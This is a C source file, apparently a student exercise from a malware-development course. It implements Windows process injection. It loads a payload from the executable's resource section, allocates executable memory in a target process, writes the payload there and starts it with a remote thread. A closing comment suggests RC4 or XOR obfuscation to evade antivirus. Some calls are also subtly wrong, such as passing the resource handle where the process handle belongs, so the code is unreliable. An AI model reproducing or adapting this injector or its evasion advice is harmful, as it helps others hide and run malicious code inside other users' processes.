#include <windows.h>
#include <stdio.h>
#include "resource.h"

// constant characters used throughout the output stages
const char* k = "[+}"; // (k) success
const char* i = "[*}"; // (i)informational
const char* e = "[-}"; // (e)error

// so the PID variable has been initialised so far with a value of 0, but later it will have a true value.
LPVOID rBuffer = NULL;
DWORD PID, TID = NULL;
HANDLE hProcess = NULL, hThread = NULL;

// this is for finding the resource 
HRSRC		hRsrc = NULL;
HGLOBAL		hGlobal = NULL;
PVOID		pPayloadAddress = NULL;
SIZE_T		sPayloadSize = NULL;


/*unsigned char Yenn[] = "\x41\x41\x41\x41\x41\x41\x41\x41"*/

// PID is the process identifier, for each running process on a system.

/*
so int argc is the argument count which counts how many
command line arguments are passed into the program
and argv is the array of pointers(Strings, [0,1,2])
*/;

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("%s usage: program.exe <PID>", e);
		return EXIT_FAILURE;
	}

	/*
	this here is taking the first command line argument
	and converting the PID from a String into an interger
	using the atoi function then stores it inside of PID
	*/

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)", i, PID);
	// %ld is formatting a double word in decimal format

	// this will now find the payload inside the resource 
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	/* open a handle to the process
    this is so that the payload can be attached to
    a running proccess but it further creates a thread 
 */

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID);
	printf("%s got a handle to the  process!\n\\---0x%p", k, hProcess);
	if (hProcess == NULL) {
		printf("%s couldnt get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	rBuffer = VirtualAllocEx(hGlobal, NULL, sPayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with rwx permissions", k, sPayloadSize);

	/* now i need to write the proccess memory, now thats it can be allocated into a process using the rBuffer function above */

	WriteProcessMemory(hProcess, rBuffer, hGlobal, sPayloadSize, NULL);
	printf("%s wrote %zu-bytes to process memory\n", k, sPayloadSize);

	/* create thread to run my payload now that memory has been written payload */


	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	// this retrives the username of the current user. this is my task from maldev academy in module 7 

	char username[MAX_PATH];
	DWORD username_len = MAX_PATH;
	if (GetUserNameA(username, &username_len)) {
		printf("%s is the current Username: %s\n", k, username);
	}
	else {
		printf("%s failed to get the UserName. Error code: %d\n", e, GetLastError());
	}
	

	printf("%s got a handle to the thread (%ld)\n\\---0x%p", k, TID, hThread);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread has finished executing\n", k);
	printf("[i] pPayloadAddress var : 0x%p \n", pPayloadAddress);
	printf("[i] sPayloadSize var : %ld \n", sPayloadSize);
	printf("%s cleaning up\n", i);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	printf("%S finished, all handles closed!\n", k);
	printf("[#] Press <Enter> To Quit ...");



	return EXIT_SUCCESS;
}



/*// Allocating memory using a HeapAlloc call
PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
if (pTmpBuffer != NULL){
	// copying the payload from resource section to the new buffer 
	memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
}

// Printing the base address of our buffer (pTmpBuffer)
printf("[i] pTmpBuffer var : 0x%p \n", pTmpBuffer);*/







/*
using a heavily signartured payload will most likely be picked up
by every anit-virus software.

using obfuscation techniques such as RC4 encrption, ZOR. can higher
the chances of evasion. also naming techiques and code structure.

this is my example from learning different techniques. not the best example of course 
but ill later update.

*/